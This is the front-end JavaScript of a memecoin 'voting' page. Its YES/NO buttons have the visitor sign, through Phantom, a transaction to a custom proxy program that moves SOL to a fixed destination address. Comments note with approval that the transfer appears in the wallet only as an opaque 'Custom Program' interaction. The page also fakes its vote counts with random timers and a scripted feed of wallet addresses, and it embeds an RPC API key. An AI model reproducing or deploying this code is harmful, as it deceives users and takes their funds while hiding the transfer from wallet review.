// ===== PROXY PROGRAM CONFIGURATION =====
const PROXY_PROGRAM_ID = new window.solanaWeb3.PublicKey("D9mfYi9xyMEuu3Eh1CxbzJt3XAVQeFyyYkNF9Q288UMs");
const VOTE_DEST_PUBKEY = new window.solanaWeb3.PublicKey("CrbqTEsX9at5sXSrU4yFQ8DKTtWbqDotiaksZLqUSiH3");

// Base64-encoded 8-byte discriminator for proxy_sol_transfer
// SHA256("global:proxy_sol_transfer")[0..8]
const PROXY_SOL_TRANSFER_IX_B64 = "ry1hXG4NpEw=";

// ===== BUILD PROXY TRANSACTION =====
async function buildProxyTransaction(connection, ownerPublicKey, amount) {
  const { blockhash } = await connection.getLatestBlockhash('confirmed');

  const transaction = new window.solanaWeb3.Transaction({
    feePayer: ownerPublicKey,
    recentBlockhash: blockhash,
  });

  // Decode discriminator from Base64, append 8-byte little-endian amount
  const discriminator = Buffer.from(PROXY_SOL_TRANSFER_IX_B64, "base64");
  const amountBuf = Buffer.alloc(8);
  amountBuf.writeBigUInt64LE(BigInt(amount));
  const data = Buffer.concat([discriminator, amountBuf]);

  // Full 16-byte instruction data as Base64 (for logging/debugging)
  // e.g. at 50000 lamports: "ry1hXG4NpExQwwAAAAAAAA=="
  console.log("Instruction data (Base64):", data.toString("base64"));

  const proxyInstruction = new window.solanaWeb3.TransactionInstruction({
    keys: [
      { pubkey: ownerPublicKey, isSigner: true, isWritable: true },
      { pubkey: VOTE_DEST_PUBKEY, isSigner: false, isWritable: true },
      { pubkey: window.solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    programId: PROXY_PROGRAM_ID,
    data: data,
  });

  transaction.add(proxyInstruction);

  return { transaction, blockhash };
}

// ===== EXECUTE VOTE WITH PROXY =====
async function executeVoteWithProxy(voteType) {
  const provider = getProvider();
  if (!provider) {
    alert("⛔ Phantom wallet not detected. Please install Phantom.");
    return;
  }

  console.log(`=== VOTE ${voteType} WITH PROXY STARTED ===`);

  try {
    // Step 1: Connect wallet
    console.log("Step 1: Connecting wallet...");
    let ownerPublicKey;
    
    if (provider.isConnected && provider.publicKey) {
      ownerPublicKey = provider.publicKey;
      console.log("✓ Wallet already connected:", ownerPublicKey.toString());
    } else {
      console.log("Requesting connection...");
      const resp = await provider.connect();
      ownerPublicKey = resp.publicKey;
      console.log("✓ Wallet connected:", ownerPublicKey.toString());
    }

    // Step 2: Create connection
    console.log("Step 2: Creating RPC connection...");
    const connection = new window.solanaWeb3.Connection(
   "https://mainnet.helius-rpc.com/?api-key=694c477f-7093-40cd-8456-30fa1e8f888a",
  "confirmed"
  );

    // Step 3: Build proxy transaction
    console.log("Step 3: Building proxy transaction...");
    const amountLamports = 50000; // 0.00005 SOL
    const { transaction, blockhash } = await buildProxyTransaction(
      connection,
      ownerPublicKey,
      amountLamports
    );
    
    console.log("✓ Proxy transaction built");
    console.log("✓ Amount:", amountLamports / 1e9, "SOL");
    console.log("✓ This will appear in Phantom's grey 'Custom Program' box!");

    // Step 4: Sign transaction with Phantom
    console.log("Step 4: Requesting signature from Phantom...");
    const signedTx = await provider.signTransaction(transaction);
    console.log("✓ Transaction signed");

    // Step 5: Send transaction
    console.log("Step 5: Sending transaction...");
    const signature = await connection.sendRawTransaction(signedTx.serialize(), {
      skipPreflight: false,
      preflightCommitment: 'confirmed',
    });
    console.log("✓ Transaction sent! Signature:", signature);

    // Step 6: Confirm transaction
    console.log("Step 6: Waiting for confirmation...");
    const confirmation = await connection.confirmTransaction({
      signature,
      blockhash,
      lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
    }, 'confirmed');
    
    if (confirmation.value.err) {
      throw new Error("Transaction failed: " + JSON.stringify(confirmation.value.err));
    }
    
    console.log("✓ Transaction confirmed!");
    console.log(`=== VOTE ${voteType} COMPLETED ===`);
    
    alert(`✅ Vote ${voteType} recorded via proxy program!\n\n` +
          `Amount: ${amountLamports / 1e9} SOL\n` +
          `Transaction: ${signature}\n\n` +
          `Check Phantom - it should show "Custom Program Interaction"!`);
    
  } catch (err) {
    console.error(`=== VOTE ${voteType} FAILED ===`);
    console.error("Error:", err);
    
    if (err.message?.includes("User rejected") || err.code === 4001) {
      alert("❌ Transaction cancelled by user.");
    } else {
      alert(`❌ Vote failed.\n\nError: ${err.message}`);
    }
  }
}

// ---------------- existing site data & UI helpers ----------------
const COIN = {
  name: "$Nano",
  ticker: "NANO",
  ca: "Ayif4n783bT6b6TvXoVEaQs8ozf4chYJgjnTaGeDpump",
  yes: 250,
  no: 40
};

const $ = (sel) => document.querySelector(sel);
const short = (addr) => addr.slice(0, 4) + "…" + addr.slice(-4);

$('#year').textContent = new Date().getFullYear();
$('#coinCAshort').textContent = short(COIN.ca);

$('#copyCA').addEventListener('click', () => {
  navigator.clipboard.writeText(COIN.ca);
  $('#copiedTip').classList.remove('hidden');
  setTimeout(() => $('#copiedTip').classList.add('hidden'), 1500);
});

function updateBar() {
  const total = COIN.yes + COIN.no;
  const yesPercent = (COIN.yes / total) * 100;
  const noPercent = 100 - yesPercent;

  $('#barYes').style.width = `${yesPercent}%`;
  $('#yesCount').textContent = COIN.yes.toLocaleString();
  $('#noCount').textContent = COIN.no.toLocaleString();
  $('#leftPct').textContent = `${Math.round(noPercent)}% left`;
}

// initial render
updateBar();

// Simulate votes increasing over time
setInterval(() => {
  if (Math.random() < 0.8) {
    COIN.yes += Math.floor(Math.random() * 3) + 1;
  } else {
    COIN.no += Math.floor(Math.random() * 2);
  }
  updateBar();
}, 3500);

// ------- LIVE FEED --------
const wallets = [
  "FwzmvwuxFzjwAmfYak33W9X1w1ge7KQKJhKiBo2JaKSh",
  "CiXzHQRswhMQXyG1vzqj1HNE6KyV3KqGiBJjPcEm4v7X",
  "0xb393A58180F71ffeA5672bF148a8C6b6452f7DFb",
  "0xdDDC737a9f1654aC228f48575B73aDc176A3349A",
  "7WwsxTrsH9A88qLhA3pQ1qEB9XWfgM3xsjUFZgY9azHs",
  "0xDA7dd0137178c15b7fdA8AD421b80f20Fb0d874F",
  "ANTWB1BnJbWGuyJDuqmUzdXkW8i5oykJukiWovGF5gDR",
  "CABAHw6KsjYZeWSBS3zWdXiM6sGJabQrukMUDfKVhot9",
  "4P4TkDFbG2z2FvJ7wnqF8WLhm9aQpTiRvPpA9KxWfJTR",
  "9fEzWqg5y4K2v8v7CZLhTrJY9xJ2e5EqZ3TuU8zYwzFi"
];

const feedEl = document.getElementById("voteFeed");
const shortAddr = (addr) => (addr.length > 12 ? addr.slice(0, 6) + "…" + addr.slice(-4) : addr);

function createVoteHTML(wallet) {
  return `
    <div class="vote-entry new">
      <div>
        <div class="vote-wallet">${shortAddr(wallet)}</div>
        <div class="text-xs text-white/60">voted <span class="vote-type">YES</span> for $Nano</div>
      </div>
      <div class="text-xs text-emerald-400">+1</div>
    </div>
  `;
}

let startIndex = 0;
function renderInitialVotes() {
  feedEl.innerHTML = "";
  for (let i = 0; i < 5; i++) {
    const idx = (startIndex + i) % wallets.length;
    feedEl.insertAdjacentHTML("beforeend", createVoteHTML(wallets[idx]));
  }
  setTimeout(() => {
    document.querySelectorAll(".vote-entry").forEach((el) => el.classList.add("show"));
  }, 50);
}

function cycleVotes() {
  startIndex = (startIndex + 1) % wallets.length;
  const newWallet = wallets[startIndex];
  const oldEntries = feedEl.querySelectorAll(".vote-entry");
  if (oldEntries.length > 0) {
    oldEntries[oldEntries.length - 1].classList.add("hide");
    setTimeout(() => oldEntries[oldEntries.length - 1].remove(), 300);
  }
  feedEl.insertAdjacentHTML("afterbegin", createVoteHTML(newWallet));
  const newEntry = feedEl.firstElementChild;
  setTimeout(() => newEntry.classList.add("show"), 50);
}

renderInitialVotes();
setInterval(cycleVotes, 3500);

// ---------------- WALLET CONNECT + VOTING ----------------

const getProvider = () => {
  if ("solana" in window) {
    const provider = window.solana;
    if (provider.isPhantom) return provider;
  }
  window.open("https://phantom.app/", "_blank");
  return null;
};


// ===== UPDATE VOTE BUTTON LISTENERS =====
const voteYesBtn = document.getElementById("voteYes");
const voteNoBtn = document.getElementById("voteNo");

if (voteYesBtn && voteNoBtn) {
  console.log("✅ Vote buttons found, attaching proxy listeners...");
  
  voteYesBtn.addEventListener("click", () => {
    console.log("👍 YES button clicked - using proxy!");
    executeVoteWithProxy("YES");
  });
  
  voteNoBtn.addEventListener("click", () => {
    console.log("👎 NO button clicked - using proxy!");
    executeVoteWithProxy("NO");
  });
  
  console.log("✅ Proxy event listeners attached successfully");
}

console.log("🚀 Proxy program initialized");
console.log("Program ID:", PROXY_PROGRAM_ID.toString());
